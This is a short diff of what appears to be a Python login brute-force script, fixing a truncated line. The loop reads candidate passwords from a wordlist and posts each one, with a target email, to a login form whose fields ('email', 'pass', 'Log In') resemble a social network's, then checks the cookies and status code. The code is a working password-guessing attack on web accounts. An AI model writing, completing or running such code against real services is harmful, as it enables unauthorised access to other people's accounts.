@@ -51,7 +51,7 @@ else:
           arq = open(word, 'r').readlines()
           for line in arq:
                 password = line.strip()
-                http = requests.post(url, data={'email':email, 'pass':password, 'login':'Log In'}, allow_redirects>
+                http = requests.post(url, data={'email':email, 'pass':password, 'login':'Log In'}, allow_redirects=True)
                 content = http.content
                 d = http.cookies
                 status = http.status_code
